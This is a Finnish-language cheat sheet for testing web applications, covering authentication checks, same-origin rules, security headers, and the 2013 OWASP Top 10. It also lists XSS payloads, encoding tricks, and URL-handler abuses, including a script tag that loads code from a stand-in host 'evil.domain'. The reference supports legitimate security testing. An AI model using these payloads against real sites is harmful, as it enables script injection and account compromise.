# Verkkosovelluksen kybertestauksen referenssi

## Autentikoinnin tarkastuslista

* Onko tunniste satunnainen, siten että sitä ei voi arvata tai päätellä?
* Voiko tunnistetta ohjata hyökkääjän haltuun jotenkin? (HttpOnly ja secure -flagit?)
* Voiko käyttäjän puolesta tehdä pyyntöjä sovellukseen? (CSRF-esto käytössä?)
* Voiko sovelluksen tarkastusta käyttäjätunnuksesta/salasanasta manipuloida?

## Same-origin policy

|URL|Lopputulos|Syy|
|--|:---:|---:|
|http://www.example.com/dir/page2.html|Ok|Sama protokolla, host ja portti|
|http://www.example.com/dir2/other.html|Ok|Sama protokolla, host ja portti|
|http://username:password@www.example.com/dir2/other.html|Ok|Sama protokolla, host ja port|
|http://www.example.com:81/dir/other.html|Epäonnistuu|Sama protokolla, host, mutta eri portti|
|https://www.example.com/dir/other.html|Epäonnistuu|Eri protokolla|
|http://en.example.com/dir/other.html|Epäonnistuu|Eri host|
|http://example.com/dir/other.html|Epäonnistuu|Eri host (vaaditaan tarkka vastaavuus)|
|http://v2.www.example.com/dir/other.html|Epäonnistuu|Eri host (vaaditaan tarkka vastaavuus)|
|http://www.example.com:80/dir/other.html|Epäselvä|Portti määritelty. Riippuu selaimesta.|

## HTTP headerit

|Header|Mikä se on?|
|------|-----------|
X-Content-Type-Options: nosniff|Estää selainta arvaamasta uudelleen MIME-typeä.|
|Content-Type |MIME-type..|
|Content-Disposition|Liitetiedostojen erottamiseen sisällöstä, joka näytetään selaimessa.|
|X-Frame-Options:SAMEORIGIN| Estää sovelluksen avaamisen frameen mielivaltaisesta domainista.|
|Cookie + secure| Salaa cookien. Toimii vain jos on HTTPS, eli ei välttämättä devausympäristössä.|
|cookie + HTTPOnly| Cookien käsittely javascriptilla estetty. Session cookieen ei ole mitenkään tarpeellista päästä käsiksi Javascriptilla clientin päässä.|
|Same-Site|CSRF-esto|
|Strict-Transport-Security| Ohjeistaa selainta käyttämään aina HTTPS:ää. Ignoroidaan HTTP:tä käytettäessä.|
|Cache-Control|IE:n kanssa monenlaisia ongelmia luvassa. Voi toimia myös eri tavalla HTTPS-protokollassa.|
|X-XSS-Protection|Ehdottaa selaimelle, että sisällössä voi olla potentiaalisesti XSS sisältöä.|
|X-Forwarded-For|Pyynnön mukana välitettävä headeri palvelimelle, jota käytetään reverse proxy-palvelimen kanssa. Tätä ei pitäisi hyväksyä käyttäjän selaimelta, koska se voi aiheuttaa ongelmia. Vastaava myös x-forwarded-host|
|Content-Security-Policy|Voi asettaa rajoituksia sille mitä sisältöä selain voi ladata ja estää ongelmia.| 
|Access-Control-Allow-Origin|Jos sovellus tarvitsee Cross-origin requesteja (CORS)| 
|Upgrade-Insecure-Requests|Selain voidaan ohjata käyttämään HTTPS-protokollaa HTTP:n sijaan automaattisesti.|

## Enkoodaukset

* normaali: ```alert(1)```
* Javascript, Octal: ```\141\154\145\162\164\50\61\51```
* HTML, hex: ```&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;```
* HTML, decimal: ```&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;```
* Javascript,HEX: ```\x61\x6c\x65\x72\x74\x28\x31\x29```
* Javascript, unicode ```\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029```
* Javascript, Unicode ```\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}\u{0028}\u{0031}\u{0029}```
* URL: ```%61%6c%65%72%74%28%31%29```
* Base64


## Javascriptin ajaminen (XSS)

* ```<script>alert(1)</script>```
* ```<script src="http://evil.domain/hak.js"/>```
* Viallinen HTML, esim. ```<scr<script>ipt>alert('XSS')</scr<script>ipt>```
* ```<img src="lol.jpg" onError=alert(1)>```
* onLoad, onChange yms. vastaavasti
* ```<img src=x onerror=alert('XSS')//``` - kommentin hyväksikäyttö
* ```<img src=x:alert(alt) onerror=eval(src) alt=xss>```
* ```<svg/onload=alert(1)>``` SVG-kuvaformaatin hyväksikäyttö + event handler.
* ```<svg id=alert(1) onload=eval(id)>```
* ```<input autofocus onfocus=alert(1)>```
* ```<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">```
* XML-dokumentin sisällä (CDATA ja muita keinoja)
* SVG-kuvan käyttö alustana (CDATA + script)
* JSON-rakenteen sisällä 

## URL handlerit

* data:text/html - esimerkiksi ```data:text/html,<script>alert(1)</script>```
* ```javascript:alert(1)```
* ```http://;URL=javascript:alert(1)```
* Base64-enkoodauksen hyväksikäyttö: ```data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+```
* ```mailto:```  -sähköpostin lähetys
* ```callto:```  -puhelinsoitto (esimerkiksi maksulliseen numeroon)
* ```tel:``` - puhelinsoitto (esimerkiksi maksulliseen numeroon)
* ```file://``` - tiedostojärjestelmä paikallisen koneen levyllä

## Parametrien käsittelyn rikkominen

* Parametrin jättäminen pois
* Arvon korvaaminen jollain muulla (jonkun muun id, -1,  tms..)
* Saman parametrin toistaminen useita kertoja eri arvoilla (HTTP Parameter Pollution)
* Erikoisarvojen käyttö: ```null```, ```nil```, ```NaN```, lukualueiden ääriarvot
* Erikoismerkit: ```'```, ```%``` ja muut 
* Arvojen lisääminen pyynnön mukana. 
* ylipitkän arvon käyttö
* välilyöntien käyttö alussa tai lopussa


## Piilotetut elementit käyttöliittymässä

* ```form``` elementin hidden-kentät.
* CSS-tyyleillä piilotetut käyttöliittymäelementit voivat avata pääsyn toimintoihin, joita ei pitäisi päästä käyttämään.

## OWASP Top 10 (2013)

* A1 Injection
* A2 Broken Authentication
* A3 Cross-Site Scripting (XSS)
* A4 Insecure Direct Object references
* A5 Security Misconfiguration
* A6 Sensitive Data Exposure
* A7 Missing Function Level Access Control 
* A8 Cross-Site Request Forgery (CSRF)
* A9 Using Components with Known Vulnerabilities
* A10 Unvalidated Redirects and Forwards


# Lisenssi

![lisenssi](88x31.png)

Creative Commons, Attribution-NonCommercial CC BY-NC
Kts. [LISENSSI](LICENSE).

